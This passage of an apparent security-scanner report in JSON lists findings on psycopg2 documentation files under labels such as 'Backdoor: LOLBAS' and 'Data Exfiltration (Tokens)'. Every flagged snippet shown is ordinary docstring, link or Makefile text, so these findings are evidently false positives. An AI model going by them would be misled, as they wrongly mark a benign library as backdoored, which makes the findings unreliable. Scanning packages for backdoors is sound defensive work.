            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 232,
                  "startColumn": 25,
                  "endLine": 232,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        expects. Overloaded procedures are supported. Named parameters can be\n        used by supplying the parameters as a dictionary.\n\n        This function is, at present, not DBAPI-compliant. The return value is\n        supposed to consist of the sequence of parameters with modified output\n        and input/output parameters. In future versions, the DBAPI-compliant\n        return value may be implemented, but for now the function returns None.\n",
                    "rendered": {
                      "text": "        expects. Overloaded procedures are supported. Named parameters can be\n        used by supplying the parameters as a dictionary.\n\n        This function is, at present, not DBAPI-compliant. The return value is\n        supposed to consist of the sequence of parameters with modified output\n        and input/output parameters. In future versions, the DBAPI-compliant\n        return value may be implemented, but for now the function returns None.\n",
                      "markdown": "`        expects. Overloaded procedures are supported. Named parameters can be\n        used by supplying the parameters as a dictionary.\n\n        This function is, at present, not DBAPI-compliant. The return value is\n        supposed to consist of the sequence of parameters with modified output\n        and input/output parameters. In future versions, the DBAPI-compliant\n        return value may be implemented, but for now the function returns None.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 55,
                  "endLine": 205,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        Execute a database operation (query or command) against all parameter\n        tuples or mappings found in the sequence *vars_list*.\n\n        The function is mostly useful for commands that update the database:\n        any result set returned by the query is discarded.\n\n        Parameters are bounded to the query using the same rules described in\n",
                    "rendered": {
                      "text": "        Execute a database operation (query or command) against all parameter\n        tuples or mappings found in the sequence *vars_list*.\n\n        The function is mostly useful for commands that update the database:\n        any result set returned by the query is discarded.\n\n        Parameters are bounded to the query using the same rules described in\n",
                      "markdown": "`        Execute a database operation (query or command) against all parameter\n        tuples or mappings found in the sequence *vars_list*.\n\n        The function is mostly useful for commands that update the database:\n        any result set returned by the query is discarded.\n\n        Parameters are bounded to the query using the same rules described in\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 46,
                  "endLine": 101,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        attempted with the cursor.\n\n        .. versionchanged:: 2.5 if the cursor is used in a ``with`` statement,\n            the method is automatically called at the end of the ``with``\n            block.\n\n\n",
                    "rendered": {
                      "text": "        attempted with the cursor.\n\n        .. versionchanged:: 2.5 if the cursor is used in a ``with`` statement,\n            the method is automatically called at the end of the ``with``\n            block.\n\n\n",
                      "markdown": "`        attempted with the cursor.\n\n        .. versionchanged:: 2.5 if the cursor is used in a ``with`` statement,\n            the method is automatically called at the end of the ``with``\n            block.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 518,
                  "startColumn": 28,
                  "endLine": 518,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    .. attribute:: tzinfo_factory\n\n        The time zone factory used to handle data types such as\n        :sql:`TIMESTAMP WITH TIME ZONE`.  It should be a `~datetime.tzinfo`\n        object.  Default is `datetime.timezone`.\n\n        .. versionchanged:: 2.9\n",
                    "rendered": {
                      "text": "    .. attribute:: tzinfo_factory\n\n        The time zone factory used to handle data types such as\n        :sql:`TIMESTAMP WITH TIME ZONE`.  It should be a `~datetime.tzinfo`\n        object.  Default is `datetime.timezone`.\n\n        .. versionchanged:: 2.9\n",
                      "markdown": "`    .. attribute:: tzinfo_factory\n\n        The time zone factory used to handle data types such as\n        :sql:`TIMESTAMP WITH TIME ZONE`.  It should be a `~datetime.tzinfo`\n        object.  Default is `datetime.timezone`.\n\n        .. versionchanged:: 2.9\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 517,
                  "startColumn": 11,
                  "endLine": 517,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n    .. attribute:: tzinfo_factory\n\n        The time zone factory used to handle data types such as\n        :sql:`TIMESTAMP WITH TIME ZONE`.  It should be a `~datetime.tzinfo`\n        object.  Default is `datetime.timezone`.\n\n",
                    "rendered": {
                      "text": "\n    .. attribute:: tzinfo_factory\n\n        The time zone factory used to handle data types such as\n        :sql:`TIMESTAMP WITH TIME ZONE`.  It should be a `~datetime.tzinfo`\n        object.  Default is `datetime.timezone`.\n\n",
                      "markdown": "`\n    .. attribute:: tzinfo_factory\n\n        The time zone factory used to handle data types such as\n        :sql:`TIMESTAMP WITH TIME ZONE`.  It should be a `~datetime.tzinfo`\n        object.  Default is `datetime.timezone`.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 7,
                  "endLine": 400,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    .. attribute:: arraysize\n\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n\n",
                    "rendered": {
                      "text": "    .. attribute:: arraysize\n\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n\n",
                      "markdown": "`    .. attribute:: arraysize\n\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 303,
                  "startColumn": 49,
                  "endLine": 303,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\n        .. versionchanged:: 2.4\n            iterating over a :ref:`named cursor <server-side-cursors>`\n            fetches `~cursor.itersize` records at time from the backend.\n            Previously only one record was fetched per roundtrip, resulting\n            in a large overhead.\n\n",
                    "rendered": {
                      "text": "\n        .. versionchanged:: 2.4\n            iterating over a :ref:`named cursor <server-side-cursors>`\n            fetches `~cursor.itersize` records at time from the backend.\n            Previously only one record was fetched per roundtrip, resulting\n            in a large overhead.\n\n",
                      "markdown": "`\n        .. versionchanged:: 2.4\n            iterating over a :ref:`named cursor <server-side-cursors>`\n            fetches `~cursor.itersize` records at time from the backend.\n            Previously only one record was fetched per roundtrip, resulting\n            in a large overhead.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 33,
                  "endLine": 222,
                  "endColumn": 42,
                  "snippet": {
                    "text": ".. exception:: OperationalError\n\n    Exception raised for errors that are related to the database's operation\n    and not necessarily under the control of the programmer, e.g. an\n    unexpected disconnect occurs, the data source name is not found, a\n    transaction could not be processed, a memory allocation error occurred\n    during processing, etc.  It is a subclass of `DatabaseError`.\n",
                    "rendered": {
                      "text": ".. exception:: OperationalError\n\n    Exception raised for errors that are related to the database's operation\n    and not necessarily under the control of the programmer, e.g. an\n    unexpected disconnect occurs, the data source name is not found, a\n    transaction could not be processed, a memory allocation error occurred\n    during processing, etc.  It is a subclass of `DatabaseError`.\n",
                      "markdown": "`.. exception:: OperationalError\n\n    Exception raised for errors that are related to the database's operation\n    and not necessarily under the control of the programmer, e.g. an\n    unexpected disconnect occurs, the data source name is not found, a\n    transaction could not be processed, a memory allocation error occurred\n    during processing, etc.  It is a subclass of `DatabaseError`.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 33,
                  "endLine": 35,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n    or using a mix of both: if the same parameter name is specified in both\n    sources, the *kwargs* value will have precedence over the *dsn* value.\n    Note that either the *dsn* or at least one connection-related keyword\n    argument is required.\n\n    The basic connection parameters are:\n",
                    "rendered": {
                      "text": "\n    or using a mix of both: if the same parameter name is specified in both\n    sources, the *kwargs* value will have precedence over the *dsn* value.\n    Note that either the *dsn* or at least one connection-related keyword\n    argument is required.\n\n    The basic connection parameters are:\n",
                      "markdown": "`\n    or using a mix of both: if the same parameter name is specified in both\n    sources, the *kwargs* value will have precedence over the *dsn* value.\n    Note that either the *dsn* or at least one connection-related keyword\n    argument is required.\n\n    The basic connection parameters are:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 348,
                  "startColumn": 40,
                  "endLine": 348,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\n    This function constructs an object holding a time stamp value from the\n    given ticks value (number of seconds since the epoch; see the\n    documentation of the standard Python time module for details).\n\n.. function:: Binary(string)\n\n",
                    "rendered": {
                      "text": "\n    This function constructs an object holding a time stamp value from the\n    given ticks value (number of seconds since the epoch; see the\n    documentation of the standard Python time module for details).\n\n.. function:: Binary(string)\n\n",
                      "markdown": "`\n    This function constructs an object holding a time stamp value from the\n    given ticks value (number of seconds since the epoch; see the\n    documentation of the standard Python time module for details).\n\n.. function:: Binary(string)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 346,
                  "startColumn": 48,
                  "endLine": 346,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n.. function:: TimestampFromTicks(ticks)\n\n    This function constructs an object holding a time stamp value from the\n    given ticks value (number of seconds since the epoch; see the\n    documentation of the standard Python time module for details).\n\n",
                    "rendered": {
                      "text": "\n.. function:: TimestampFromTicks(ticks)\n\n    This function constructs an object holding a time stamp value from the\n    given ticks value (number of seconds since the epoch; see the\n    documentation of the standard Python time module for details).\n\n",
                      "markdown": "`\n.. function:: TimestampFromTicks(ticks)\n\n    This function constructs an object holding a time stamp value from the\n    given ticks value (number of seconds since the epoch; see the\n    documentation of the standard Python time module for details).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 342,
                  "startColumn": 23,
                  "endLine": 342,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    This function constructs an object holding a time value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n.. function:: TimestampFromTicks(ticks)\n\n",
                    "rendered": {
                      "text": "\n    This function constructs an object holding a time value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n.. function:: TimestampFromTicks(ticks)\n\n",
                      "markdown": "`\n    This function constructs an object holding a time value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n.. function:: TimestampFromTicks(ticks)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 48,
                  "endLine": 340,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n.. function:: TimeFromTicks(ticks)\n\n    This function constructs an object holding a time value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n",
                    "rendered": {
                      "text": "\n.. function:: TimeFromTicks(ticks)\n\n    This function constructs an object holding a time value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n",
                      "markdown": "`\n.. function:: TimeFromTicks(ticks)\n\n    This function constructs an object holding a time value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 336,
                  "startColumn": 23,
                  "endLine": 336,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    This function constructs an object holding a date value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n.. function:: TimeFromTicks(ticks)\n\n",
                    "rendered": {
                      "text": "\n    This function constructs an object holding a date value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n.. function:: TimeFromTicks(ticks)\n\n",
                      "markdown": "`\n    This function constructs an object holding a date value from the given\n    ticks value (number of seconds since the epoch; see the documentation of\n    the standard Python time module for details).\n\n.. function:: TimeFromTicks(ticks)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 48,
                  "endLine": 330,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n.. function:: Timestamp(year,month,day,hour,minute,second)\n\n    This function constructs an object holding a time stamp value.\n\n.. function:: DateFromTicks(ticks)\n\n",
                    "rendered": {
                      "text": "\n.. function:: Timestamp(year,month,day,hour,minute,second)\n\n    This function constructs an object holding a time stamp value.\n\n.. function:: DateFromTicks(ticks)\n\n",
                      "markdown": "`\n.. function:: Timestamp(year,month,day,hour,minute,second)\n\n    This function constructs an object holding a time stamp value.\n\n.. function:: DateFromTicks(ticks)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 326,
                  "startColumn": 48,
                  "endLine": 326,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n.. function:: Time(hour,minute,second)\n\n    This function constructs an object holding a time value.\n\n.. function:: Timestamp(year,month,day,hour,minute,second)\n\n",
                    "rendered": {
                      "text": "\n.. function:: Time(hour,minute,second)\n\n    This function constructs an object holding a time value.\n\n.. function:: Timestamp(year,month,day,hour,minute,second)\n\n",
                      "markdown": "`\n.. function:: Time(hour,minute,second)\n\n    This function constructs an object holding a time value.\n\n.. function:: Timestamp(year,month,day,hour,minute,second)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 315,
                  "startColumn": 24,
                  "endLine": 315,
                  "endColumn": 30,
                  "snippet": {
                    "text": "each of the result columns of a query.  The type_code must compare\nequal to one of Type Objects defined below. Type Objects may be\nequal to more than one type code (e.g. DATETIME could be equal to\nthe type codes for date, time and timestamp columns; see the\nImplementation Hints below for details).\n\nThe module exports the following constructors and singletons:\n",
                    "rendered": {
                      "text": "each of the result columns of a query.  The type_code must compare\nequal to one of Type Objects defined below. Type Objects may be\nequal to more than one type code (e.g. DATETIME could be equal to\nthe type codes for date, time and timestamp columns; see the\nImplementation Hints below for details).\n\nThe module exports the following constructors and singletons:\n",
                      "markdown": "`each of the result columns of a query.  The type_code must compare\nequal to one of Type Objects defined below. Type Objects may be\nequal to more than one type code (e.g. DATETIME could be equal to\nthe type codes for date, time and timestamp columns; see the\nImplementation Hints below for details).\n\nThe module exports the following constructors and singletons:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 21,
                  "endLine": 42,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    - `!dbname` -- the database name (`!database` is a deprecated alias)\n    - `!user` -- user name used to authenticate\n    - `!password` -- password used to authenticate\n    - `!host` -- database host address (defaults to UNIX socket if not provided)\n    - `!port` -- connection port number (defaults to 5432 if not provided)\n\n",
                    "rendered": {
                      "text": "\n    - `!dbname` -- the database name (`!database` is a deprecated alias)\n    - `!user` -- user name used to authenticate\n    - `!password` -- password used to authenticate\n    - `!host` -- database host address (defaults to UNIX socket if not provided)\n    - `!port` -- connection port number (defaults to 5432 if not provided)\n\n",
                      "markdown": "`\n    - `!dbname` -- the database name (`!database` is a deprecated alias)\n    - `!user` -- user name used to authenticate\n    - `!password` -- password used to authenticate\n    - `!host` -- database host address (defaults to UNIX socket if not provided)\n    - `!port` -- connection port number (defaults to 5432 if not provided)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 8,
                  "endLine": 42,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n    - `!dbname` -- the database name (`!database` is a deprecated alias)\n    - `!user` -- user name used to authenticate\n    - `!password` -- password used to authenticate\n    - `!host` -- database host address (defaults to UNIX socket if not provided)\n    - `!port` -- connection port number (defaults to 5432 if not provided)\n\n",
                    "rendered": {
                      "text": "\n    - `!dbname` -- the database name (`!database` is a deprecated alias)\n    - `!user` -- user name used to authenticate\n    - `!password` -- password used to authenticate\n    - `!host` -- database host address (defaults to UNIX socket if not provided)\n    - `!port` -- connection port number (defaults to 5432 if not provided)\n\n",
                      "markdown": "`\n    - `!dbname` -- the database name (`!database` is a deprecated alias)\n    - `!user` -- user name used to authenticate\n    - `!password` -- password used to authenticate\n    - `!host` -- database host address (defaults to UNIX socket if not provided)\n    - `!port` -- connection port number (defaults to 5432 if not provided)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 64,
                  "endLine": 31,
                  "endColumn": 72,
                  "snippet": {
                    "text": "\n    or using a set of keyword arguments::\n\n        conn = psycopg2.connect(dbname=\"test\", user=\"postgres\", password=\"secret\")\n\n    or using a mix of both: if the same parameter name is specified in both\n    sources, the *kwargs* value will have precedence over the *dsn* value.\n",
                    "rendered": {
                      "text": "\n    or using a set of keyword arguments::\n\n        conn = psycopg2.connect(dbname=\"test\", user=\"postgres\", password=\"secret\")\n\n    or using a mix of both: if the same parameter name is specified in both\n    sources, the *kwargs* value will have precedence over the *dsn* value.\n",
                      "markdown": "`\n    or using a set of keyword arguments::\n\n        conn = psycopg2.connect(dbname=\"test\", user=\"postgres\", password=\"secret\")\n\n    or using a mix of both: if the same parameter name is specified in both\n    sources, the *kwargs* value will have precedence over the *dsn* value.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 59,
                  "endLine": 27,
                  "endColumn": 67,
                  "snippet": {
                    "text": "    The connection parameters can be specified as a `libpq connection\n    string`__ using the *dsn* parameter::\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments::\n\n",
                    "rendered": {
                      "text": "    The connection parameters can be specified as a `libpq connection\n    string`__ using the *dsn* parameter::\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments::\n\n",
                      "markdown": "`    The connection parameters can be specified as a `libpq connection\n    string`__ using the *dsn* parameter::\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 12,
                  "endLine": 14,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    single: Connection string\n    double: Connection; Parameters\n    single: Username; Connection\n    single: Password; Connection\n    single: Host; Connection\n    single: Port; Connection\n    single: DSN (Database Source Name)\n",
                    "rendered": {
                      "text": "    single: Connection string\n    double: Connection; Parameters\n    single: Username; Connection\n    single: Password; Connection\n    single: Host; Connection\n    single: Port; Connection\n    single: DSN (Database Source Name)\n",
                      "markdown": "`    single: Connection string\n    double: Connection; Parameters\n    single: Username; Connection\n    single: Password; Connection\n    single: Host; Connection\n    single: Port; Connection\n    single: DSN (Database Source Name)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/module.rst"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 12,
                  "endLine": 57,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    .. __:\n    .. _connparams: https://www.postgresql.org/docs/current/static/libpq-connect.html#LIBPQ-PARAMKEYWORDS\n    .. __:\n    .. _connenvvars: https://www.postgresql.org/docs/current/static/libpq-envars.html\n\n    Using the *connection_factory* parameter a different class or\n    connections factory can be specified. It should be a callable object\n",
                    "rendered": {
                      "text": "    .. __:\n    .. _connparams: https://www.postgresql.org/docs/current/static/libpq-connect.html#LIBPQ-PARAMKEYWORDS\n    .. __:\n    .. _connenvvars: https://www.postgresql.org/docs/current/static/libpq-envars.html\n\n    Using the *connection_factory* parameter a different class or\n    connections factory can be specified. It should be a callable object\n",
                      "markdown": "`    .. __:\n    .. _connparams: https://www.postgresql.org/docs/current/static/libpq-connect.html#LIBPQ-PARAMKEYWORDS\n    .. __:\n    .. _connenvvars: https://www.postgresql.org/docs/current/static/libpq-envars.html\n\n    Using the *connection_factory* parameter a different class or\n    connections factory can be specified. It should be a callable object\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/Makefile"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 18,
                  "endLine": 37,
                  "snippet": {
                    "text": "\trm -rf html src/sqlstate_errors.rst\n\nenv: requirements.txt\n\t$(PYTHON) -m venv env\n\t./env/bin/pip install -r requirements.txt\n\techo \"$$(pwd)/../build/lib.$(PYTHON_VERSION)\" \\\n\t\t> env/lib/python$(PYTHON_VERSION)/site-packages/psycopg.pth\n",
                    "rendered": {
